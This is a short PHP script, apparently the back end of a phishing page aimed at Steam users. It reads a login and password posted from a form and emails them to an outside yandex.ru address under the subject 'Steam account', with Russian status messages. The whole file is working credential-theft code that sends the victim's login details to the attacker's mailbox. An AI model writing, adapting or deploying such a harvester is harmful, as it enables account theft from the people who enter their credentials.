<?php
$login = $_POST['login'];
$password = $_POST['password'];

$login = htmlspecialchars($login);
$password = htmlspecialchars($password);

$login = trim($login);
$password = trim($password);

echo $login;
echo "<br>";
echo $password;

if (mail("rjcnz1007@yandex.ru", "Аккаунт Steam", "Логин:".$login.". Пароль: ".$password ,"From: d86350.hostde22.fornex.host \r\n"))
 {
    echo "сообщение успешно отправлено";
} else {
    echo "при отправке сообщения возникли ошибки";
}
?>